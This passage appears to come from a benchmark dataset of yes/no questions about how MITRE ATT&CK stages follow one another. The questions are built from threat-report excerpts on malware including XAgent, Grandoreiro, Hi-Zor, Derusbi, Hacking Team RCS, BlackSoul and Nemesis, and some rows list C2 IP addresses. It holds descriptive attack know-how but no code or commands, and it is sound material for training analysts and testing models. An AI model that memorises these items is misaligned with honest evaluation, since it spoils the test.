systems.
Execution: The XAgent app is fully functional malware. After being installed on iOS 7, the app's icon is hidden and it runs in the background immediately. When we try to terminate it by killing the process, it will restart almost immediately.  Installing the malware into an iOS 8 device yields different results. The icon is not hidden and it also cannot restart automatically. This suggests that the malware was designed prior to the release of iOS 8 last September 2014.
Discovery: The app is designed to collect all kind of information on an iOS device. It is able to perform the following routines:  Collect text messages Get contact lists Get pictures Collect geo-location data Start voice recording Get a list of installed apps Get a list of processes Get the Wi-Fi status",Yes,PawnStorm_iOS
2786,79,79-Command and Control-T1132-Data Encoding,"After collecting information like text messages, contact lists, and geo-location data during the Discovery phase, is it likely that the malware will use a Base64-encoded token with a 5-byte random prefix to identify modules while communicating with the Command and Control server?","Command and Control: Besides collecting information from the iOS device, the app sends the information out via HTTP. It uses POST request to send messages, and GET request to receive commands.  The malware's log messages are written in HTML and color coded, making it easier for human operators to read. Error messages tend to be in red, while others are in green as shown in the figure below.  The full uniform resource identifier (URI) for C&C HTTP requests is randomly generated, according to a template agreed upon with the C&C server. The base URI can be seen in Figure 4, and parameters are chosen from the list below and appended to the base URI.  The malware uses a token to identify which module is communicating. The token is Base64 encoded data, but padded with a 5-byte random prefix so that it looks like valid Base64 data. See the first line ""ai="" part in the figure below.  Reverse engineering also revealed additional communication functions.  The app is also able to upload files via FTP protocol.","Initial Access: In our continued research on Operation Pawn Storm, we found one interesting poisoned pawn   The iOS malware we found is among those advanced malware. We believe the iOS malware gets installed on already compromised systems, and it is very similar to next stage SEDNIT malware we have found for Microsoft Windows systems.
Execution: The XAgent app is fully functional malware. After being installed on iOS 7, the app's icon is hidden and it runs in the background immediately. When we try to terminate it by killing the process, it will restart almost immediately.  Installing the malware into an iOS 8 device yields different results. The icon is not hidden and it also cannot restart automatically. This suggests that the malware was designed prior to the release of iOS 8 last September 2014.
Discovery: The app is designed to collect all kind of information on an iOS device. It is able to perform the following routines:  Collect text messages Get contact lists Get pictures Collect geo-location data Start voice recording Get a list of installed apps Get a list of processes Get the Wi-Fi status",Yes,PawnStorm_iOS
2787,79,79-Command and Control-T1105-Ingress Tool Transfer,"After the app collects information such as text messages, contact lists, geo-location data, and performs routines on the iOS device, is it likely to send the gathered information via HTTP before uploading files via FTP protocol as part of its Command and Control operations?","Command and Control: Besides collecting information from the iOS device, the app sends the information out via HTTP. It uses POST request to send messages, and GET request to receive commands.  The malware's log messages are written in HTML and color coded, making it easier for human operators to read. Error messages tend to be in red, while others are in green as shown in the figure below.  The full uniform resource identifier (URI) for C&C HTTP requests is randomly generated, according to a template agreed upon with the C&C server. The base URI can be seen in Figure 4, and parameters are chosen from the list below and appended to the base URI.  The malware uses a token to identify which module is communicating. The token is Base64 encoded data, but padded with a 5-byte random prefix so that it looks like valid Base64 data. See the first line ""ai="" part in the figure below.  Reverse engineering also revealed additional communication functions.  The app is also able to upload files via FTP protocol.","Initial Access: In our continued research on Operation Pawn Storm, we found one interesting poisoned pawn   The iOS malware we found is among those advanced malware. We believe the iOS malware gets installed on already compromised systems, and it is very similar to next stage SEDNIT malware we have found for Microsoft Windows systems.
Execution: The XAgent app is fully functional malware. After being installed on iOS 7, the app's icon is hidden and it runs in the background immediately. When we try to terminate it by killing the process, it will restart almost immediately.  Installing the malware into an iOS 8 device yields different results. The icon is not hidden and it also cannot restart automatically. This suggests that the malware was designed prior to the release of iOS 8 last September 2014.
Discovery: The app is designed to collect all kind of information on an iOS device. It is able to perform the following routines:  Collect text messages Get contact lists Get pictures Collect geo-location data Start voice recording Get a list of installed apps Get a list of processes Get the Wi-Fi status",Yes,PawnStorm_iOS
2788,79,79-Discovery-T1614-System Location Discovery,"After executing itself in the background on iOS 7 devices while hiding its icon and restarting when terminated, is it likely that the XAgent app will collect geo-location data as part of its discovery routine before sending the collected data out via HTTP to its C&C server?",Discovery: The app is designed to collect all kind of information on an iOS device. It is able to perform the following routines:  Collect text messages Get contact lists Get pictures Collect geo-location data Start voice recording Get a list of installed apps Get a list of processes Get the Wi-Fi status,"Initial Access: In our continued research on Operation Pawn Storm, we found one interesting poisoned pawn   The iOS malware we found is among those advanced malware. We believe the iOS malware gets installed on already compromised systems, and it is very similar to next stage SEDNIT malware we have found for Microsoft Windows systems.
Execution: The XAgent app is fully functional malware. After being installed on iOS 7, the app's icon is hidden and it runs in the background immediately. When we try to terminate it by killing the process, it will restart almost immediately.  Installing the malware into an iOS 8 device yields different results. The icon is not hidden and it also cannot restart automatically. This suggests that the malware was designed prior to the release of iOS 8 last September 2014.
Command and Control: Besides collecting information from the iOS device, the app sends the information out via HTTP. It uses POST request to send messages, and GET request to receive commands.  The malware's log messages are written in HTML and color coded, making it easier for human operators to read. Error messages tend to be in red, while others are in green as shown in the figure below.  The full uniform resource identifier (URI) for C&C HTTP requests is randomly generated, according to a template agreed upon with the C&C server. The base URI can be seen in Figure 4, and parameters are chosen from the list below and appended to the base URI.  The malware uses a token to identify which module is communicating. The token is Base64 encoded data, but padded with a 5-byte random prefix so that it looks like valid Base64 data. See the first line ""ai="" part in the figure below.  Reverse engineering also revealed additional communication functions.  The app is also able to upload files via FTP protocol.",Yes,PawnStorm_iOS
2794,8,8-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"Is it likely that Grandoreiro will collect information about the victim's computer, including operating system details and installed security products, after employing numerous tricks such as API hooking and detection of virtual environments to evade detection and emulation?","Defense Evasion: Grandoreiro uses a large number of tricks to evade detection and emulation. It hooks APIs to prevent loading DLLs of banking protection software, checks for loaded modules, tries to kill their processes, blocks them at the firewall level, and changes file system paths to disable them. It also monitors hooks on important functions, checks for debugging tools, and detects virtual environments like VMWare and Virtual PC.","Initial Access: Grandoreiro, a Latin American banking trojan, has been distributed solely through spam, often using fake Java or Flash updates. Recently, it has exploited COVID-19 fears, directing victims to fake websites via spam emails. The spam emails contain links to websites offering these fake updates or exploiting current events for malicious purposes.
Persistence: To ensure persistence, Grandoreiro creates a .LNK file in the Windows startup directory. This allows the malware to maintain its foothold on the system across restarts and other interruptions.
Privilege Escalation: Grandoreiro employs various techniques to gain higher-level permissions, including hooking APIs to prevent loading DLLs of banking protection software, attempting to kill their processes, blocking them at the firewall level, and changing file system paths to disable them. It also monitors hooks on important functions and employs a method for privilege escalation by registering a binary as the default handler for .MSC files, then running such a file to execute with elevated privileges.
Credential Access: Grandoreiro is capable of stealing credentials stored in the Google Chrome web browser and data stored in Microsoft Outlook.
Discovery: Grandoreiro collects information about its victims, including computer name, username, operating system version and bitness, and whether specific banking protection software is installed. It also lists installed security products.
Command and Control: Grandoreiro communicates with its C&C server using the RealThinClient SDK, which operates over HTTP. It performs a handshake and checks for commands every few seconds. The first command received from the C&C server is a list of all currently connected victims, including collected information about their machines.
Others: Grandoreiro has been active since at least 2017, targeting Brazil, Peru, Mexico, and Spain. It is written in Delphi and has been rapidly developed, with several new versions each month. The malware authors focus on hiding the actual C&C address using a Domain Generation Algorithm (DGA) and making the trojan modular, with separate DLLs for each targeted bank. Grandoreiro's binaries are bloated to at least a few hundred megabytes, using binary padding with large BMP images in the resources section to make the files large and difficult to analyze. The malware also uses a spam tool for its distribution campaigns, which is believed to be written by the same authors as the trojan itself.",Yes,Grandoreiro_ How engorged can an EXE get_ _ WeLiveSecurity
2797,8,8-Discovery-T1033-System Owner/User Discovery,"Is it likely that Grandoreiro will employ techniques to steal credentials stored in Google Chrome and Microsoft Outlook after collecting information about the computer's name, username, and installed banking protection software?","Discovery: Grandoreiro collects information about its victims, including computer name, username, operating system version and bitness, and whether specific banking protection software is installed. It also lists installed security products.","Initial Access: Grandoreiro, a Latin American banking trojan, has been distributed solely through spam, often using fake Java or Flash updates. Recently, it has exploited COVID-19 fears, directing victims to fake websites via spam emails. The spam emails contain links to websites offering these fake updates or exploiting current events for malicious purposes.
Persistence: To ensure persistence, Grandoreiro creates a .LNK file in the Windows startup directory. This allows the malware to maintain its foothold on the system across restarts and other interruptions.
Privilege Escalation: Grandoreiro employs various techniques to gain higher-level permissions, including hooking APIs to prevent loading DLLs of banking protection software, attempting to kill their processes, blocking them at the firewall level, and changing file system paths to disable them. It also monitors hooks on important functions and employs a method for privilege escalation by registering a binary as the default handler for .MSC files, then running such a file to execute with elevated privileges.
Defense Evasion: Grandoreiro uses a large number of tricks to evade detection and emulation. It hooks APIs to prevent loading DLLs of banking protection software, checks for loaded modules, tries to kill their processes, blocks them at the firewall level, and changes file system paths to disable them. It also monitors hooks on important functions, checks for debugging tools, and detects virtual environments like VMWare and Virtual PC.
Credential Access: Grandoreiro is capable of stealing credentials stored in the Google Chrome web browser and data stored in Microsoft Outlook.
Command and Control: Grandoreiro communicates with its C&C server using the RealThinClient SDK, which operates over HTTP. It performs a handshake and checks for commands every few seconds. The first command received from the C&C server is a list of all currently connected victims, including collected information about their machines.
Others: Grandoreiro has been active since at least 2017, targeting Brazil, Peru, Mexico, and Spain. It is written in Delphi and has been rapidly developed, with several new versions each month. The malware authors focus on hiding the actual C&C address using a Domain Generation Algorithm (DGA) and making the trojan modular, with separate DLLs for each targeted bank. Grandoreiro's binaries are bloated to at least a few hundred megabytes, using binary padding with large BMP images in the resources section to make the files large and difficult to analyze. The malware also uses a spam tool for its distribution campaigns, which is believed to be written by the same authors as the trojan itself.",Yes,Grandoreiro_ How engorged can an EXE get_ _ WeLiveSecurity
2798,8,8-Discovery-T1087-Account Discovery,"After ensuring persistence by creating a .LNK file in the Windows startup directory, is Grandoreiro likely to collect information such as usernames during its discovery phase before communicating with its C&C server using the RealThinClient SDK over HTTP?","Discovery: Grandoreiro collects information about its victims, including computer name, username, operating system version and bitness, and whether specific banking protection software is installed. It also lists installed security products.","Initial Access: Grandoreiro, a Latin American banking trojan, has been distributed solely through spam, often using fake Java or Flash updates. Recently, it has exploited COVID-19 fears, directing victims to fake websites via spam emails. The spam emails contain links to websites offering these fake updates or exploiting current events for malicious purposes.
Persistence: To ensure persistence, Grandoreiro creates a .LNK file in the Windows startup directory. This allows the malware to maintain its foothold on the system across restarts and other interruptions.
Privilege Escalation: Grandoreiro employs various techniques to gain higher-level permissions, including hooking APIs to prevent loading DLLs of banking protection software, attempting to kill their processes, blocking them at the firewall level, and changing file system paths to disable them. It also monitors hooks on important functions and employs a method for privilege escalation by registering a binary as the default handler for .MSC files, then running such a file to execute with elevated privileges.
Defense Evasion: Grandoreiro uses a large number of tricks to evade detection and emulation. It hooks APIs to prevent loading DLLs of banking protection software, checks for loaded modules, tries to kill their processes, blocks them at the firewall level, and changes file system paths to disable them. It also monitors hooks on important functions, checks for debugging tools, and detects virtual environments like VMWare and Virtual PC.
Credential Access: Grandoreiro is capable of stealing credentials stored in the Google Chrome web browser and data stored in Microsoft Outlook.
Command and Control: Grandoreiro communicates with its C&C server using the RealThinClient SDK, which operates over HTTP. It performs a handshake and checks for commands every few seconds. The first command received from the C&C server is a list of all currently connected victims, including collected information about their machines.
Others: Grandoreiro has been active since at least 2017, targeting Brazil, Peru, Mexico, and Spain. It is written in Delphi and has been rapidly developed, with several new versions each month. The malware authors focus on hiding the actual C&C address using a Domain Generation Algorithm (DGA) and making the trojan modular, with separate DLLs for each targeted bank. Grandoreiro's binaries are bloated to at least a few hundred megabytes, using binary padding with large BMP images in the resources section to make the files large and difficult to analyze. The malware also uses a spam tool for its distribution campaigns, which is believed to be written by the same authors as the trojan itself.",Yes,Grandoreiro_ How engorged can an EXE get_ _ WeLiveSecurity
2799,8,8-Discovery-T1082-System Information Discovery,"After Grandoreiro ensures persistence by creating a .LNK file in the Windows startup directory, is it likely that it will discover system information such as the operating system version before communicating with the C&C server using the RealThinClient SDK to receive commands?","Discovery: Grandoreiro collects information about its victims, including computer name, username, operating system version and bitness, and whether specific banking protection software is installed. It also lists installed security products.","Initial Access: Grandoreiro, a Latin American banking trojan, has been distributed solely through spam, often using fake Java or Flash updates. Recently, it has exploited COVID-19 fears, directing victims to fake websites via spam emails. The spam emails contain links to websites offering these fake updates or exploiting current events for malicious purposes.
Persistence: To ensure persistence, Grandoreiro creates a .LNK file in the Windows startup directory. This allows the malware to maintain its foothold on the system across restarts and other interruptions.
Privilege Escalation: Grandoreiro employs various techniques to gain higher-level permissions, including hooking APIs to prevent loading DLLs of banking protection software, attempting to kill their processes, blocking them at the firewall level, and changing file system paths to disable them. It also monitors hooks on important functions and employs a method for privilege escalation by registering a binary as the default handler for .MSC files, then running such a file to execute with elevated privileges.
Defense Evasion: Grandoreiro uses a large number of tricks to evade detection and emulation. It hooks APIs to prevent loading DLLs of banking protection software, checks for loaded modules, tries to kill their processes, blocks them at the firewall level, and changes file system paths to disable them. It also monitors hooks on important functions, checks for debugging tools, and detects virtual environments like VMWare and Virtual PC.
Credential Access: Grandoreiro is capable of stealing credentials stored in the Google Chrome web browser and data stored in Microsoft Outlook.
Command and Control: Grandoreiro communicates with its C&C server using the RealThinClient SDK, which operates over HTTP. It performs a handshake and checks for commands every few seconds. The first command received from the C&C server is a list of all currently connected victims, including collected information about their machines.
Others: Grandoreiro has been active since at least 2017, targeting Brazil, Peru, Mexico, and Spain. It is written in Delphi and has been rapidly developed, with several new versions each month. The malware authors focus on hiding the actual C&C address using a Domain Generation Algorithm (DGA) and making the trojan modular, with separate DLLs for each targeted bank. Grandoreiro's binaries are bloated to at least a few hundred megabytes, using binary padding with large BMP images in the resources section to make the files large and difficult to analyze. The malware also uses a spam tool for its distribution campaigns, which is believed to be written by the same authors as the trojan itself.",Yes,Grandoreiro_ How engorged can an EXE get_ _ WeLiveSecurity
2800,8,8-Discovery-T1518-Software Discovery,"After Grandoreiro ensures persistence by creating a .LNK file in the Windows startup directory, is it likely to perform software discovery by collecting information about banking protection software and other installed security products before communicating with its C&C server using the RealThinClient SDK?","Discovery: Grandoreiro collects information about its victims, including computer name, username, operating system version and bitness, and whether specific banking protection software is installed. It also lists installed security products.","Initial Access: Grandoreiro, a Latin American banking trojan, has been distributed solely through spam, often using fake Java or Flash updates. Recently, it has exploited COVID-19 fears, directing victims to fake websites via spam emails. The spam emails contain links to websites offering these fake updates or exploiting current events for malicious purposes.
Persistence: To ensure persistence, Grandoreiro creates a .LNK file in the Windows startup directory. This allows the malware to maintain its foothold on the system across restarts and other interruptions.
Privilege Escalation: Grandoreiro employs various techniques to gain higher-level permissions, including hooking APIs to prevent loading DLLs of banking protection software, attempting to kill their processes, blocking them at the firewall level, and changing file system paths to disable them. It also monitors hooks on important functions and employs a method for privilege escalation by registering a binary as the default handler for .MSC files, then running such a file to execute with elevated privileges.
Defense Evasion: Grandoreiro uses a large number of tricks to evade detection and emulation. It hooks APIs to prevent loading DLLs of banking protection software, checks for loaded modules, tries to kill their processes, blocks them at the firewall level, and changes file system paths to disable them. It also monitors hooks on important functions, checks for debugging tools, and detects virtual environments like VMWare and Virtual PC.
Credential Access: Grandoreiro is capable of stealing credentials stored in the Google Chrome web browser and data stored in Microsoft Outlook.
Command and Control: Grandoreiro communicates with its C&C server using the RealThinClient SDK, which operates over HTTP. It performs a handshake and checks for commands every few seconds. The first command received from the C&C server is a list of all currently connected victims, including collected information about their machines.
Others: Grandoreiro has been active since at least 2017, targeting Brazil, Peru, Mexico, and Spain. It is written in Delphi and has been rapidly developed, with several new versions each month. The malware authors focus on hiding the actual C&C address using a Domain Generation Algorithm (DGA) and making the trojan modular, with separate DLLs for each targeted bank. Grandoreiro's binaries are bloated to at least a few hundred megabytes, using binary padding with large BMP images in the resources section to make the files large and difficult to analyze. The malware also uses a spam tool for its distribution campaigns, which is believed to be written by the same authors as the trojan itself.",Yes,Grandoreiro_ How engorged can an EXE get_ _ WeLiveSecurity
2806,80,80-Defense Evasion-T1027-Obfuscated Files or Information,"After Hi-Zor RAT creates a copy of itself with a '.dat' extension and embeds itself into the registry run key for persistence, is it likely to use string-stacking and double XOR encoding for defense evasion before sending a victim's Volume Serial Number information in the beacon communication over a secure connection (e.g., TLS)?","Defense Evasion: Hi-Zor RAT uses string-stacking, a technique seen in Etumbot and Ixeshe families, and double XOR encoding for command and control communication. It also uses common applications, such as VPN installers, as decoys, a tactic observed in Sakula.","Execution: The Hi-Zor RAT, identified in the INOCNATION campaign, executes processes, establishes a reverse shell, manages files, and has upload/download capabilities. It also includes a kill switch/uninstall feature.
Persistence: Hi-Zor RAT creates a copy of itself with a '.dat' extension and entrenches in the registry run key with 'regsvr32.exe' pointing to a DLL file without a DLL extension, similar to the Derusbi malware.
Command and Control: Hi-Zor RAT sends a victim's Volume Serial Number information in the beacon and communicates over a secure connection (e.g., TLS).
Others: The Fidelis Threat Advisory #1020 provides a detailed analysis of the Hi-Zor RAT, including new indicators and an updated Yara rule for detection. The Hi-Zor RAT is considered a new variant distinct from Sakula based on differences in code, network traffic, string obfuscation, file type, registry entrenchment, and embedded files. The webinar 'Dissecting the Malware Involved in the INOCNATION Campaign' is scheduled to further discuss the investigation.",Yes,introducing-hi-zor-rat.html
2812,81,81-Command and Control-T1071-Application Layer Protocol,"After the Derusbi malware gathers system information and beacons this data to the command and control infrastructure via destination port 443, is it likely to employ HTTP beaconing with obfuscated communication and include HTTP POST requests to /photos/photo.asp in its C2 interactions?","Command and Control: The malware binds to a raw socket on a random source port between 31800 and 31900 and beacons to the preconfigured destination port 443. The traffic is not SSL/TLS encrypted. A backup communication method with HTTP beacon is used, with content obfuscated using variable 4-byte XOR keys. The C2 interactions include HTTP POST requests to /photos/photo.asp and responses from the server.","Initial Access: The adversary obtained SSH access to the target system, a large public research institution in the United States, and used the GNU utility wget to fetch malware samples from the IP address 175.45.250.xxx. The malware binary downloaded had a date string in its naming convention that matched the day it was downloaded, suggesting it was compiled on that day, indicating active developer involvement.
Execution: Upon execution, the custom loader loads the Derusbi malware into memory. Derusbi then drops the Turbo Linux Kernel Module to disk, loads it into the kernel, and deletes it from disk to avoid detection. The client uses Turbo to hide relevant user space processes.
Persistence: The Turbo Linux Kernel Module (LKM) provides persistence by hiding processes, making detection of the attacker's malicious applications more difficult when running on the victim's system.
Defense Evasion: The Derusbi malware and Turbo kernel module employ cloaking and anti-analysis techniques. The Turbo LKM is loaded into kernel space to modify the system's global call table, particularly pertaining to process IDs (PIDs), allowing user space applications to hide and unhide any process. Additionally, the LKM disables the CPU's control register zero's (CR0) write protection to modify the system call table.
Discovery: The Derusbi malware gathers information about the victim host, including the local host name, GCC version, and system information, which is transferred back to the command and control infrastructure via network beacons.",Yes,TA_Fidelis_Turbo_1602_0
2814,81,81-Discovery-T1082-System Information Discovery,"After using the Turbo Linux Kernel Module (LKM) to modify the system's global call table and evade detection, is it likely that Derusbi will gather system information about the victim host before binding to a raw socket and initiating communication with the C2 server?","Discovery: The Derusbi malware gathers information about the victim host, including the local host name, GCC version, and system information, which is transferred back to the command and control infrastructure via network beacons.","Initial Access: The adversary obtained SSH access to the target system, a large public research institution in the United States, and used the GNU utility wget to fetch malware samples from the IP address 175.45.250.xxx. The malware binary downloaded had a date string in its naming convention that matched the day it was downloaded, suggesting it was compiled on that day, indicating active developer involvement.
Execution: Upon execution, the custom loader loads the Derusbi malware into memory. Derusbi then drops the Turbo Linux Kernel Module to disk, loads it into the kernel, and deletes it from disk to avoid detection. The client uses Turbo to hide relevant user space processes.
Persistence: The Turbo Linux Kernel Module (LKM) provides persistence by hiding processes, making detection of the attacker's malicious applications more difficult when running on the victim's system.
Defense Evasion: The Derusbi malware and Turbo kernel module employ cloaking and anti-analysis techniques. The Turbo LKM is loaded into kernel space to modify the system's global call table, particularly pertaining to process IDs (PIDs), allowing user space applications to hide and unhide any process. Additionally, the LKM disables the CPU's control register zero's (CR0) write protection to modify the system call table.
Command and Control: The malware binds to a raw socket on a random source port between 31800 and 31900 and beacons to the preconfigured destination port 443. The traffic is not SSL/TLS encrypted. A backup communication method with HTTP beacon is used, with content obfuscated using variable 4-byte XOR keys. The C2 interactions include HTTP POST requests to /photos/photo.asp and responses from the server.",Yes,TA_Fidelis_Turbo_1602_0
2817,82,82-Defense Evasion-T1027-Obfuscated Files or Information,"After delivering spearphishing emails with spyware disguised as a PDF file to gain initial access, is it likely that the authors of Hacking Team's spyware used VMProtect for obfuscation to evade detection before establishing communication with the identified C&C servers?","Defense Evasion: The post-leak samples of Hacking Team's spyware were found to have forged Manifest metadata to masquerade as legitimate applications, appearing as 'Advanced SystemCare 9 (9.3.0.1121)', 'Toolwiz Care 3.1.0.0', and 'SlimDrivers (2.3.1.10)'. The authors used VMProtect to make the samples less prone to detection, a technique also common among pre-leak Hacking Team spyware. A difference in Startup file size was noted as a primitive detection evasion technique, changing from 4MB pre-leak to 6MB post-leak.","Initial Access: In the early stages of the investigation, ESET researchers, with input from Citizen Lab, discovered a version of Hacking Team's Remote Control System (RCS) spyware being used in the wild, signed with a previously unseen valid digital certificate. At least in two cases, the spyware was detected in an executable file disguised as a PDF document, attached to a spearphishing email targeting diplomats.
Command and Control: The analysis identified several C&C (Command and Control) servers associated with the post-leak Hacking Team spyware samples. The servers are located at IP addresses 149.154.153.223, 192.243.101.125, 180.235.133.23, 192.243.101.124, 95.110.167.74, 149.154.153.223, 188.166.244.225, 45.33.108.172, 178.79.186.40, 95.110.167.74, 173.236.149.166, 188.226.170.222, 173.236.149.166, 46.165.236.62, 199.175.54.209, 199.175.54.228, and 95.110.167.74.
Others: ESET's analysis of Hacking Team's post-leak spyware samples, compiled between September 2015 and October 2017, suggests active development by Hacking Team's developers. The samples were signed with six different certificates issued to Valeriano Bedeschi, Raffaele Carnacina, Megabit, OOO, ADD Audit, Media Lid, and Ziber Ltd. The versioning observed in the analyzed samples continues where Hacking Team left off before the breach, and follows the same patterns. The functionality of the spyware largely overlaps with that in the leaked source code, with no significant updates confirmed. ESET has detected these new Hacking Team spyware samples in fourteen countries.",Yes,new-traces-hacking-team-wild
2821,83,83-Command and Control-T1102-Web Service,"After retrieving files from the Cloudflare Workers service during the execution phase, is it likely that BlackSoul will utilize Cloudflare Workers Service infrastructure to communicate with its C2 server before performing automated data exfiltration over the C2 channel?",Command and Control: BlackSoul communicates with the C2 server over the RESTful Strapi protocol and JSON-based data encoding. It uses Cloudflare Workers Service (*.workers[.]dev) to host C2 infrastructure and supports DNS-over-HTTPS (DoH) using cloudflare-dns.com.,"Initial Access: On November 27, QuoIntelligence detected a new malware campaign that likely originated with a spear phishing email delivering a CAB archive named 1-10-20-hb44_final, impersonating a document from the National Institute of Standards and Technology (NIST) website. The campaign is attributed to the threat actor ReconHellcat and delivers a previously undocumented remote access Trojan (RAT) named BlackSoul.
Execution: The malware campaign involved a malicious loader named 1-10-20-hb44_final.exe, which uses obfuscation techniques similar to those observed in previous ReconHellcat campaigns delivering BlackWater malware. The loader utilizes C2 infrastructure hosted on the Cloudflare Workers service to retrieve two files: an executable named blacksoul and a Dynamic-Link Library (DLL) named blacksoulLib. The loader also opens a legitimate document from the NIST website as a decoy.
Defense Evasion: BlackSoul uses various obfuscation techniques, including dynamic string construction on the stack and deobfuscation with fixed key XOR cipher and Caesar cipher using variable shift values. The malware's string obfuscation applies only to strings in the main program but excludes strings of third-party compiled-in libraries.
Credential Access: The DLL named blacksoulLib, which is called by BlackSoul, searches the victim's machine for Firefox, Chrome, and Opera data. If browser data is not found, the program terminates early. It also decodes a C2 URL and a Cloudflare DNS-over-HTTPS (DoH) URL, generates further login information for the C2, and returns gathered data to BlackSoul in JSON format, including a username with three random appended characters and a password consisting of 24 random characters.
Collection: BlackSoul is capable of file transfers and running arbitrary commands. It supports handling commands from its C2 server for executing commands and returning results, downloading files from a URL and storing them on the machine, retrieving specified files from the machine and uploading them to the C2, and updating the configuration file (UsrClass.json) which contains C2 server info and miscellaneous fields.
Exfiltration: BlackSoul is capable of exfiltrating data over the C2 channel and supports automated exfiltration.",Yes,quointelligence.eu-ReconHellcat Uses NIST Theme as Lure To Deliver New BlackSoul Malware
2823,83,83-Exfiltration-T1020-Automated Exfiltration,"After BlackSoul communicates with the C2 server using the RESTful Strapi protocol and JSON-based encoding as part of its Command and Control, is it likely that BlackSoul will exfiltrate data over the C2 channel through automated exfiltration?",Exfiltration: BlackSoul is capable of exfiltrating data over the C2 channel and supports automated exfiltration.,"Initial Access: On November 27, QuoIntelligence detected a new malware campaign that likely originated with a spear phishing email delivering a CAB archive named 1-10-20-hb44_final, impersonating a document from the National Institute of Standards and Technology (NIST) website. The campaign is attributed to the threat actor ReconHellcat and delivers a previously undocumented remote access Trojan (RAT) named BlackSoul.
Execution: The malware campaign involved a malicious loader named 1-10-20-hb44_final.exe, which uses obfuscation techniques similar to those observed in previous ReconHellcat campaigns delivering BlackWater malware. The loader utilizes C2 infrastructure hosted on the Cloudflare Workers service to retrieve two files: an executable named blacksoul and a Dynamic-Link Library (DLL) named blacksoulLib. The loader also opens a legitimate document from the NIST website as a decoy.
Defense Evasion: BlackSoul uses various obfuscation techniques, including dynamic string construction on the stack and deobfuscation with fixed key XOR cipher and Caesar cipher using variable shift values. The malware's string obfuscation applies only to strings in the main program but excludes strings of third-party compiled-in libraries.
Credential Access: The DLL named blacksoulLib, which is called by BlackSoul, searches the victim's machine for Firefox, Chrome, and Opera data. If browser data is not found, the program terminates early. It also decodes a C2 URL and a Cloudflare DNS-over-HTTPS (DoH) URL, generates further login information for the C2, and returns gathered data to BlackSoul in JSON format, including a username with three random appended characters and a password consisting of 24 random characters.
Collection: BlackSoul is capable of file transfers and running arbitrary commands. It supports handling commands from its C2 server for executing commands and returning results, downloading files from a URL and storing them on the machine, retrieving specified files from the machine and uploading them to the C2, and updating the configuration file (UsrClass.json) which contains C2 server info and miscellaneous fields.
Command and Control: BlackSoul communicates with the C2 server over the RESTful Strapi protocol and JSON-based data encoding. It uses Cloudflare Workers Service (*.workers[.]dev) to host C2 infrastructure and supports DNS-over-HTTPS (DoH) using cloudflare-dns.com.",Yes,quointelligence.eu-ReconHellcat Uses NIST Theme as Lure To Deliver New BlackSoul Malware
2827,83,83-Collection-T1560-Archive Collected Data,"After collecting browser credentials using the blacksoulLib DLL and returning data to BlackSoul in JSON format, is it likely that BlackSoul will exfiltrate collected files to the C2 server over its communication channel following its capability to run arbitrary commands and perform file transfers?","Collection: BlackSoul is capable of file transfers and running arbitrary commands. It supports handling commands from its C2 server for executing commands and returning results, downloading files from a URL and storing them on the machine, retrieving specified files from the machine and uploading them to the C2, and updating the configuration file (UsrClass.json) which contains C2 server info and miscellaneous fields.","Initial Access: On November 27, QuoIntelligence detected a new malware campaign that likely originated with a spear phishing email delivering a CAB archive named 1-10-20-hb44_final, impersonating a document from the National Institute of Standards and Technology (NIST) website. The campaign is attributed to the threat actor ReconHellcat and delivers a previously undocumented remote access Trojan (RAT) named BlackSoul.
Execution: The malware campaign involved a malicious loader named 1-10-20-hb44_final.exe, which uses obfuscation techniques similar to those observed in previous ReconHellcat campaigns delivering BlackWater malware. The loader utilizes C2 infrastructure hosted on the Cloudflare Workers service to retrieve two files: an executable named blacksoul and a Dynamic-Link Library (DLL) named blacksoulLib. The loader also opens a legitimate document from the NIST website as a decoy.
Defense Evasion: BlackSoul uses various obfuscation techniques, including dynamic string construction on the stack and deobfuscation with fixed key XOR cipher and Caesar cipher using variable shift values. The malware's string obfuscation applies only to strings in the main program but excludes strings of third-party compiled-in libraries.
Credential Access: The DLL named blacksoulLib, which is called by BlackSoul, searches the victim's machine for Firefox, Chrome, and Opera data. If browser data is not found, the program terminates early. It also decodes a C2 URL and a Cloudflare DNS-over-HTTPS (DoH) URL, generates further login information for the C2, and returns gathered data to BlackSoul in JSON format, including a username with three random appended characters and a password consisting of 24 random characters.
Command and Control: BlackSoul communicates with the C2 server over the RESTful Strapi protocol and JSON-based data encoding. It uses Cloudflare Workers Service (*.workers[.]dev) to host C2 infrastructure and supports DNS-over-HTTPS (DoH) using cloudflare-dns.com.
Exfiltration: BlackSoul is capable of exfiltrating data over the C2 channel and supports automated exfiltration.",Yes,quointelligence.eu-ReconHellcat Uses NIST Theme as Lure To Deliver New BlackSoul Malware
2829,84,84-Defense Evasion-T1542-Pre-OS Boot,"After the Nemesis bootkit achieves persistence by infecting the system's Volume Boot Record (VBR), is it likely that the malware will evade detection by executing before the Windows operating system fully loads, bypassing typical operating system integrity checks?","Defense Evasion: The Nemesis bootkit, used by the threat group FIN1, evades detection by executing before the Windows operating system fully loads, bypassing typical operating system integrity checks. Anti-virus software does not scan the malicious boot loader components as they are stored in a custom virtual file system (VFS) outside the Windows file system. Additionally, the malware components are either in the VFS or the Windows registry, which is not usually scanned by anti-virus software. The only likely detection point is live memory, but unless the bootkit and VFS components are removed, the malware will execute and load with every system start.","Persistence: In September, Mandiant Consulting discovered a financially motivated threat group, FIN1, using a bootkit named Nemesis to persistently target payment card data. This bootkit infects the system's Volume Boot Record (VBR), allowing it to execute before the Windows operating system boots, making detection and removal challenging. The malware's installation location ensures it remains even after an operating system reinstallation, which is typically considered an effective malware removal method.
Command and Control: The Nemesis malware ecosystem includes backdoors with support for various network protocols and communication channels for command and control (CnC). It provides capabilities such as file transfer, screen capture, keystroke logging, process injection, process manipulation, and task scheduling. FIN1 continually updated Nemesis during their access to the victim environment, deploying different variants and adding functionality.
Others: The threat group FIN1, potentially located in Russia or a Russian-speaking country, has been active for several years, targeting financial services organizations to steal monetizable data. The Nemesis malware ecosystem, developed by FIN1, has been continually updated with new variants and functionalities. The BOOTRASH utility, part of Nemesis, modifies the system's VBR to hijack the boot process and load Nemesis components before the Windows operating system code. This technique is rare and makes the malware difficult to detect and eradicate. Other bootkits, such as TDL4, Necurs, and Rovnix, have been documented in the past. The use of bootkits for persistence suggests that some threat actors have access to more sophisticated toolsets and may deploy them selectively based on the difficulty of penetrating the victim organization or the value of the targeted data. Incident responders and system administrators need tools that can access and search raw disks for evidence of bootkits, as re-installing the operating system is no longer a sufficient response to such compromises.",Yes,fin1-targets-boot-record
